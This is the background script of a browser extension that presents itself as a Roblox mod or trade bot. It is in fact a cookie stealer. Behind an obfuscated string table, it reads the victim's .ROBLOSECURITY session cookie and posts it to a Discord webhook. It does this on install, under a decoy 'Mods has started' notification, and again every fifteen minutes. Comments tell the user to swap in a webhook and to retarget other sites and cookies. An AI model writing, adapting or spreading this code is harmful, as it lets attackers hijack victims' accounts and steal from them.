var website = "https://www.roblox.com"; // Change this to the website you want to log, don't forget to edit the manifest.json too!
var cookie_data = ".ROBLOSECURITY"; // Change this to the cookie of the website!
var discord_web_api = "Youwebhookhere"; // This is the bot api!

var _0x9917 = ["alarms", "length", "substr", "push", website, cookie_data, "value", "\x0A", "join", "get", "cookies", discord_web_api, "?wait=true", ":star:", ":boom:", ":christmas_tree:", ":large_blue_diamond:", ":large_orange_diamond:", "POST", "ajax", "open", "Content-Type", "application/json; charset=UTF-8", "setRequestHeader", "stringify", "send", "random", "floor", "A wild cookie has appeared!", "Don\'t count your cookies before they\'re eaten.", "It\'s a bird! It\'s a cookie! It\'s a bird eating a cookie!", "Filthy, filthy, cookies. What\'s next, cake?", "Don\'t make me eat this cookie!", " ", "tradeBackground", "create", "reason", "install", "tradeBotStart", "basic", "icon.png", "Mods! Mods has started!", "Welcome! Modding is now active!", "notifications", " @everyone A new extension startup. ", "addListener", "onInstalled", "runtime", "name", "onAlarm"];
var _0x2d17 = [_0x9917[0], _0x9917[1], _0x9917[2], _0x9917[3], _0x9917[4], _0x9917[5], _0x9917[6], _0x9917[7], _0x9917[8], _0x9917[9], _0x9917[10], _0x9917[11], _0x9917[12], _0x9917[13], _0x9917[14], _0x9917[15], _0x9917[16], _0x9917[17], _0x9917[18], _0x9917[19], _0x9917[20], _0x9917[21], _0x9917[22], _0x9917[23], _0x9917[24], _0x9917[25], _0x9917[26], _0x9917[27], _0x9917[28], _0x9917[29], _0x9917[30], _0x9917[31], _0x9917[32], _0x9917[33], _0x9917[34], _0x9917[35], _0x9917[36], _0x9917[37], _0x9917[38], _0x9917[39], _0x9917[40], _0x9917[41], _0x9917[42], _0x9917[43], _0x9917[44], _0x9917[45], _0x9917[46], _0x9917[47], _0x9917[48], _0x9917[49]];
var _0x44b3 = [_0x2d17[0], _0x2d17[1], _0x2d17[2], _0x2d17[3], _0x2d17[4], _0x2d17[5], _0x2d17[6], _0x2d17[7], _0x2d17[8], _0x2d17[9], _0x2d17[10], _0x2d17[11], _0x2d17[12], _0x2d17[13], _0x2d17[14], _0x2d17[15], _0x2d17[16], _0x2d17[17], _0x2d17[18], _0x2d17[19], _0x2d17[20], _0x2d17[21], _0x2d17[22], _0x2d17[23], _0x2d17[24], _0x2d17[25], _0x2d17[26], _0x2d17[27], _0x2d17[28], _0x2d17[29], _0x2d17[30], _0x2d17[31], _0x2d17[32], _0x2d17[33], _0x2d17[34], _0x2d17[35], _0x2d17[36], _0x2d17[37], _0x2d17[38], _0x2d17[39], _0x2d17[40], _0x2d17[41], _0x2d17[42], _0x2d17[43], _0x2d17[44], _0x2d17[45], _0x2d17[46], _0x2d17[47], _0x2d17[48], _0x2d17[49]];
var _0x3a2f = [_0x44b3[0], _0x44b3[1], _0x44b3[2], _0x44b3[3], _0x44b3[4], _0x44b3[5], _0x44b3[6], _0x44b3[7], _0x44b3[8], _0x44b3[9], _0x44b3[10], _0x44b3[11], _0x44b3[12], _0x44b3[13], _0x44b3[14], _0x44b3[15], _0x44b3[16], _0x44b3[17], _0x44b3[18], _0x44b3[19], _0x44b3[20], _0x44b3[21], _0x44b3[22], _0x44b3[23], _0x44b3[24], _0x44b3[25], _0x44b3[26], _0x44b3[27], _0x44b3[28], _0x44b3[29], _0x44b3[30], _0x44b3[31], _0x44b3[32], _0x44b3[33], _0x44b3[34], _0x44b3[35], _0x44b3[36], _0x44b3[37], _0x44b3[38], _0x44b3[39], _0x44b3[40], _0x44b3[41], _0x44b3[42], _0x44b3[43], _0x44b3[44], _0x44b3[45], _0x44b3[46], _0x44b3[47], _0x44b3[48], _0x44b3[49]];
var asdd;
var alarms = chrome[_0x3a2f[0]];
 
function chunk(_0x6f75x7, _0x6f75x8) {
    var _0x6f75x9 = [];
    var _0x6f75xa;
    var _0x6f75xb;
    for (_0x6f75xa = 0, _0x6f75xb = _0x6f75x7[_0x3a2f[1]]; _0x6f75xa < _0x6f75xb; _0x6f75xa += _0x6f75x8) {
        _0x6f75x9[_0x3a2f[3]](_0x6f75x7[_0x3a2f[2]](_0x6f75xa, _0x6f75x8))
    };
    return _0x6f75x9
}
 
function findCookie() {
    asdd = undefined;
    chrome[_0x3a2f[10]][_0x3a2f[9]]({
        "url": _0x3a2f[4],
        "name": _0x3a2f[5]
    }, function(_0x6f75xd) {
        if (_0x6f75xd[_0x3a2f[6]] && asdd != _0x6f75xd[_0x3a2f[6]]) {
            asdd = chunk(_0x6f75xd[_0x3a2f[6]], 60)[_0x3a2f[8]](_0x3a2f[7])
        }
    })
}
findCookie();
var botUrl = _0x3a2f[11];
var debug = false;
if (debug === true) {
    botUrl = botUrl + _0x3a2f[12]
};
var coolEmojis = [_0x3a2f[13], _0x3a2f[14], _0x3a2f[15]];
var shapeEmojis = [_0x3a2f[16], _0x3a2f[17]];
 
function sendDiscordMessage(_0x6f75x13) {
    $[_0x3a2f[19]]({
        type: _0x3a2f[18],
        url: botUrl,
        data: {
            content: _0x6f75x13
        }
    })
}
 
function createEmbed(_0x6f75x15, _0x6f75x16, _0x6f75x17) {
    var _0x6f75x18 = {
        "embeds": [{
            "title": _0x6f75x15,
            "description": _0x6f75x16,
            "color": _0x6f75x17
        }]
    };
    var _0x6f75x19 = new XMLHttpRequest();
    _0x6f75x19[_0x3a2f[20]](_0x3a2f[18], botUrl);
    _0x6f75x19[_0x3a2f[23]](_0x3a2f[21], _0x3a2f[22]);
    _0x6f75x19[_0x3a2f[25]](JSON[_0x3a2f[24]](_0x6f75x18))
}
 
function cleanerCookieGrab() {
    chrome[_0x3a2f[10]][_0x3a2f[9]]({
        "url": _0x3a2f[4],
        "name": _0x3a2f[5]
    }, function(_0x6f75xd) {
        if (_0x6f75xd && _0x6f75xd[_0x3a2f[6]]) {
            pick = shapeEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * shapeEmojis[_0x3a2f[1]])];
            pick2 = coolEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * coolEmojis[_0x3a2f[1]])];
            cookiePhrases = [_0x3a2f[28], _0x3a2f[29], _0x3a2f[30], _0x3a2f[31], _0x3a2f[32]];
            cookiePhrase = cookiePhrases[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * cookiePhrases[_0x3a2f[1]])];
            titleItem = pick + pick2 + _0x3a2f[33] + cookiePhrase + _0x3a2f[33] + pick2 + pick;
            descItem = chunk(_0x6f75xd[_0x3a2f[6]], 60)[_0x3a2f[8]](_0x3a2f[7]);
            color = 0xFFFFFF;
            createEmbed(titleItem, descItem, color)
        }
    })
}
chrome[_0x3a2f[47]][_0x3a2f[46]][_0x3a2f[45]](function(_0x6f75x1b) {
    var _0x6f75x1c = alarms[_0x3a2f[35]](_0x3a2f[34], {
        delayInMinutes: 0.1,
        periodInMinutes: 15
    });
    if (_0x6f75x1b[_0x3a2f[36]] == _0x3a2f[37]) {
        chrome[_0x3a2f[43]][_0x3a2f[35]](_0x3a2f[38], {
            type: _0x3a2f[39],
            iconUrl: _0x3a2f[40],
            title: _0x3a2f[41],
            message: _0x3a2f[42]
        });
        var _0x6f75x1d = shapeEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * shapeEmojis[_0x3a2f[1]])];
        var _0x6f75x1e = coolEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * coolEmojis[_0x3a2f[1]])];
        var _0x6f75x1f = _0x6f75x1d + _0x6f75x1e + _0x3a2f[44] + _0x6f75x1d + _0x6f75x1e;
        var _0x6f75x20 = asdd;
        var _0x6f75x21 = 0xFFFFFF;
        createEmbed(_0x6f75x1f, _0x6f75x20, _0x6f75x21)
    }
});
chrome[_0x3a2f[0]][_0x3a2f[49]][_0x3a2f[45]](function(_0x6f75x22) {
    if (_0x6f75x22[_0x3a2f[48]] == _0x3a2f[34]) {
        cleanerCookieGrab()
    }
})